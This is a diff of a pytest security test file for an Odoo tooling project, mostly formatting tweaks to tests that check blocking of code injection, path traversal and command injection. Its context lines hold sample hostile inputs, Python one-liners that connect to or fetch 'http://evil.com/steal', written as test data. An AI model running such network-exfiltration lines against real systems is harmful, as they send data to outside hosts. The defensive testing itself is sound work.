@@ -41,6 +41,7 @@ class TestCodeInjectionPrevention:
 
     @pytest.mark.asyncio
     async def test_prevent_network_access(self) -> None:
+        # noinspection HttpUrlsUsage
         dangerous_code = [
             "import socket; s = socket.socket(); s.connect(('evil.com', 1337))",
             "import urllib.request; urllib.request.urlopen('http://evil.com/steal')",
@@ -82,12 +83,7 @@ class TestPathTraversalPrevention:
             with patch("odoo_intelligence_mcp.tools.code.read_odoo_file.DockerClientManager") as mock_docker:
                 mock_manager = MagicMock()
                 mock_manager.get_container.return_value = {"success": True}
-                mock_manager.exec_run.return_value = {
-                    "success": False,
-                    "stdout": "",
-                    "stderr": "File not found",
-                    "exit_code": 1
-                }
+                mock_manager.exec_run.return_value = {"success": False, "stdout": "", "stderr": "File not found", "exit_code": 1}
                 mock_docker.return_value = mock_manager
 
                 result = await read_odoo_file(path)
@@ -109,7 +105,7 @@ class TestPathTraversalPrevention:
                 # Second will be for reading the file
                 mock_manager.exec_run.side_effect = [
                     {"success": True, "exit_code": 0, "stdout": "", "stderr": ""},  # test -f succeeds
-                    {"success": True, "stdout": "file content", "stderr": "", "exit_code": 0}  # cat succeeds
+                    {"success": True, "stdout": "file content", "stderr": "", "exit_code": 0},  # cat succeeds
                 ]
                 mock_docker.return_value = mock_manager
 
@@ -144,7 +140,7 @@ class TestCommandInjectionPrevention:
                     # Get the docker exec call (second call)
                     exec_call = mock_run.call_args_list[1]
                     cmd = exec_call[0][0]  # First positional argument is the command list
-                    
+
                     # The module name should be sanitized - only the safe part should be used
                     # Check that the dangerous part was stripped
                     safe_module = dangerous_input.split(";")[0].split("&&")[0].split("|")[0].split("`")[0].split("$(")[0].strip()
